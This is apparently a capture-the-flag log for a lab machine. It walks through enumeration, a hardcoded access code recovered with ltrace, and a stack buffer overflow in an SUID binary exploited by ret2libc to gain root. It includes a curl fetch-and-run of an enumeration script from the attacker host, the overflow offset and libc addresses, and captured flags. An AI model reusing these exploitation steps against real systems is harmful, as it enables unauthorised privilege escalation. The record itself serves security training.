+www-data@enterprise:/$ ctrl+Z... stty raw -echo ... fg ... enter+enter
+Notes: True Shell.
+
+www-data@enterprise:/$ cat /home/jeanlucpicard/user.txt
+Result: 08552d48aa6d6d9c05dd67f1b4ba8747
+    *** USER OWNED ***
+
+Command-Line: cd ~/HackingTools/enum-suite/linPEAS
+Command-Line: sudo python3 -m http.server --bind 10.10.14.58 80
+
+www-data@enterprise:/$ cd /dev/shm
+www-data@enterprise:/dev/shm$ curl 10.10.14.58/LinEnum.sh -o LinEnum.sh
+www-data@enterprise:/dev/shm$ chmod +x LinEnum.sh
+www-data@enterprise:/dev/shm$ ./LinEnum.sh
+Result:
+    [-] Listening TCP:
+        Active Internet connections (only servers)
+        Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+        tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -
+        tcp        0      0 0.0.0.0:32812           0.0.0.0:*               LISTEN      -
+        tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+        tcp6       0      0 :::5355                 :::*                    LISTEN      -
+        tcp6       0      0 :::80                   :::*                    LISTEN      -
+        tcp6       0      0 :::8080                 :::*                    LISTEN      -
+        tcp6       0      0 :::22                   :::*                    LISTEN      -
+        tcp6       0      0 :::443                  :::*                    LISTEN      -
+
+    [-] SUID:
+        rwsr-xr-x 1 root root 12152 Sep  8  2017 /bin/lcars
+
+
+Browser: http://10.129.1.81:32812 is running /lcars
+
+www-data@enterprise:/dev/shm$ base64 /bin/lcars
+Notes: Copied output to file in local directory. (/lcars_b64.txt)
+Command-Line: base64 -d lcars_b64.txt > lcars
+Command-Line: chmod +x lcars
+Command-Line: ./lcars
+Result:
+                     _______ _______  ______ _______
+              |      |       |_____| |_____/ |______
+              |_____ |_____  |     | |    \_ ______|
+
+    Welcome to the Library Computer Access and Retrieval System
+
+    Enter Bridge Access Code:
+    uk47
+
+    Invalid Code
+    Terminating Console
+
+Command-Line ltrace ./lcars
+Notes: Pressed enter.
+Result:
+    __libc_start_main(0x565fcc91, 1, 0xfff39074, 0x565fcd30 <unfinished ...>
+    setresuid(0, 0, 0, 0x565fcca8)                           = 0xffffffff
+    puts(""
+    )                                                 = 1
+    puts("                 _______ _______"...                 _______ _______  ______ _______
+    )              = 49
+    puts("          |      |       |_____|"...          |      |       |_____| |_____/ |______
+    )              = 49
+    puts("          |_____ |_____  |     |"...          |_____ |_____  |     | |    \_ ______|
+    )              = 49
+    puts(""
+    )                                                 = 1
+    puts("Welcome to the Library Computer "...Welcome to the Library Computer Access and Retrieval System
+
+    )              = 61
+    puts("Enter Bridge Access Code: "Enter Bridge Access Code:
+    )                       = 27
+    fflush(0xf7eb8d20)                                       = 0
+    fgets(
+    "\n", 9, 0xf7eb8580)                               = 0xfff38fa7
+    strcmp("\n", "picarda1")                                 = -1
+    puts("\nInvalid Code\nTerminating Consol"...
+    Invalid Code
+    Terminating Console
+
+    )            = 35
+    fflush(0xf7eb8d20)                                       = 0
+    exit(0 <no return ...>
+    +++ exited (status 0) +++
+
+Notes: Found: strcmp("\n", "picarda1")
+
+Command-Line: ./lcars
+Result:
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    \_ ______|
+
+    Welcome to the Library Computer Access and Retrieval System
+
+    Enter Bridge Access Code:
+        picarda1
+
+    LCARS Bridge Secondary Controls -- Main Menu:
+
+    1. Navigation
+    2. Ships Log
+    3. Science
+    4. Security
+    5. StellaCartography
+    6. Engineering
+    7. Exit
+    Waiting for input:
+        4
+    Disable Security Force Fields
+    Enter Security Override:
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    Segmentation fault
+
+Notes: Possible buffer overflow attack.
+
+Command-Line: gdb ./lcars
+Result:
+    gdb ./lcars
+    GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
+    Copyright (C) 2021 Free Software Foundation, Inc.
+    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+    This is free software: you are free to change and redistribute it.
+    There is NO WARRANTY, to the extent permitted by law.
+    Type "show copying" and "show warranty" for details.
+    This GDB was configured as "x86_64-linux-gnu".
+    Type "show configuration" for configuration details.
+    For bug reporting instructions, please see:
+    <https://www.gnu.org/software/gdb/bugs/>.
+    Find the GDB manual and other documentation resources online at:
+        <http://www.gnu.org/software/gdb/documentation/>.
+
+    For help, type "help".
+    Type "apropos word" to search for commands related to "word"...
+    Reading symbols from ./lcars...
+    (No debugging symbols found in ./lcars)
+    gdb-peda$ pattern_create 500
+        'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
+    gdb-peda$ r
+        Starting program: /home/kali/HTB/Machines/Enterprise_NF/lcars
+
+                         _______ _______  ______ _______
+                  |      |       |_____| |_____/ |______
+                  |_____ |_____  |     | |    \_ ______|
+
+        Welcome to the Library Computer Access and Retrieval System
+
+        Enter Bridge Access Code:
+        picarda1
+
+                         _______ _______  ______ _______
+                  |      |       |_____| |_____/ |______
+                  |_____ |_____  |     | |    \_ ______|
+
+        Welcome to the Library Computer Access and Retrieval System
+
+
+
+        LCARS Bridge Secondary Controls -- Main Menu:
+
+        1. Navigation
+        2. Ships Log
+        3. Science
+        4. Security
+        5. StellaCartography
+        6. Engineering
+        7. Exit
+        Waiting for input:
+            4
+        Disable Security Force Fields
+        Enter Security Override:
+            AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A
+
+        Program received signal SIGSEGV, Segmentation fault.
+        [----------------------------------registers-----------------------------------]
+        EAX: 0x216
+        EBX: 0x73254125 ('%A%s')
+        ECX: 0x0
+        EDX: 0x0
+        ESI: 0xf7fb0000 --> 0x1e4d6c
+        EDI: 0xf7fb0000 --> 0x1e4d6c
+        EBP: 0x41422541 ('A%BA')
+        ESP: 0xffffd0b0 ("nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$A"...)
+        EIP: 0x25412425 ('%$A%')
+        EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+        [-------------------------------------code-------------------------------------]
+        Invalid $PC address: 0x25412425
+        [------------------------------------stack-------------------------------------]
+        0000| 0xffffd0b0 ("nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$A"...)
+        0004| 0xffffd0b4 ("A%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAs"...)
+        0008| 0xffffd0b8 ("%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-"...)
+        0012| 0xffffd0bc ("DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(A"...)
+        0016| 0xffffd0c0 ("A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs"...)
+        0020| 0xffffd0c4 ("%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)"...)
+        0024| 0xffffd0c8 ("aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEA"...)
+        0028| 0xffffd0cc ("A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs"...)
+        [------------------------------------------------------------------------------]
+        Legend: code, data, rodata, value
+        Stopped reason: SIGSEGV
+        0x25412425 in ?? ()
+    gdb-peda$ pattern_offset %$A%
+        %$A% found at offset: 212
+
+Notes: After 212 A's we get an EIP overwrite.
+
+    gdb-peda$ r
+    Starting program: /home/kali/HTB/Machines/Enterprise_NF/lcars
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    \_ ______|
+
+    Welcome to the Library Computer Access and Retrieval System
+
+    Enter Bridge Access Code:
+    picarda1
+
+                     _______ _______  ______ _______
+              |      |       |_____| |_____/ |______
+              |_____ |_____  |     | |    \_ ______|
+
+    Welcome to the Library Computer Access and Retrieval System
+
+
+
+    LCARS Bridge Secondary Controls -- Main Menu:
+
+    1. Navigation
+    2. Ships Log
+    3. Science
+    4. Security
+    5. StellaCartography
+    6. Engineering
+    7. Exit
+    Waiting for input:
+        4
+    Disable Security Force Fields
+    Enter Security Override:
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+    Program received signal SIGSEGV, Segmentation fault.
+    [----------------------------------registers-----------------------------------]
+    EAX: 0xfa
+    EBX: 0x41414141 ('AAAA')
+    ECX: 0x0
+    EDX: 0x0
+    ESI: 0xf7fb0000 --> 0x1e4d6c
+    EDI: 0xf7fb0000 --> 0x1e4d6c
+    EBP: 0x41414141 ('AAAA')
+    ESP: 0xffffd0b0 --> 0x0
+    EIP: 0x42424242 ('BBBB')
+    EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+    [-------------------------------------code-------------------------------------]
+    Invalid $PC address: 0x42424242
+    [------------------------------------stack-------------------------------------]
+    0000| 0xffffd0b0 --> 0x0
+    0004| 0xffffd0b4 --> 0xf7dd5e48 --> 0x5189
+    0008| 0xffffd0b8 --> 0x6970001a
+    0012| 0xffffd0bc ("carda1")
+    0016| 0xffffd0c0 --> 0xf7003161
+    0020| 0xffffd0c4 --> 0x56558000 --> 0x2ef0
+    0024| 0xffffd0c8 --> 0xf7fb0000 --> 0x1e4d6c
+    0028| 0xffffd0cc --> 0xf7fb0000 --> 0x1e4d6c
+    [------------------------------------------------------------------------------]
+    Legend: code, data, rodata, value
+    Stopped reason: SIGSEGV
+    0x42424242 in ?? ()
+
+Notes: EIP: 0x42424242 ('BBBB')
+
+www-data@enterprise:/dev/shm$ ldd /bin/lcars |grep libc
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
+www-data@enterprise:/dev/shm$ ldd /bin/lcars |grep libc
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
+www-data@enterprise:/dev/shm$ ldd /bin/lcars |grep libc
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
+www-data@enterprise:/dev/shm$ ldd /bin/lcars |grep libc
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
+www-data@enterprise:/dev/shm$ ldd /bin/lcars |grep libc
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
+www-data@enterprise:/dev/shm$ ldd /bin/lcars |grep libc
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
+
+www-data@enterprise:/dev/shm$ cat /proc/sys/kernel/randomize_va_space
+Result:
+    0
+Notes: Machine not randomizing addresses for lcars. Further investigation reveals ASLR (Address space layout randomization) is disabled. "libc" being loaded in same place every single time which makes the exploitation very easy.
+
+www-data@enterprise:/dev/shm$ cd /bin
+www-data@enterprise:/bin$ gdb lcars
+(gdb) r
+
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    \_ ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+Enter Bridge Access Code:
+    picarda1
+
+    Command: Control+C
+(gdb) p system
+    $3 = (<text variable, no debug info> *) 0xf7e4c060 <system>
+(gdb) p exit
+    $4 = (<text variable, no debug info> *) 0xf7e3faf0 <exit>
+(gdb) find &system,+9999999,"sh"
+    0xf7f6ddd5
+    0xf7f6e7e1
+    0xf7f70a14
+    0xf7f72582
+(gdb) x/s 0xf7f6ddd5
+    0xf7f6ddd5:     "sh"
+
+
+Command-Line: python3 overflow.py
+Result:
+    [+] Opening connection to 10.129.1.81 on port 32812: Done
+    [*] Switching to interactive mode
+
+    [*] Got EOF while reading in interactive
+$ cat /root/root.txt
+Result: cf941b35b016b3d195639b748ddee717
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
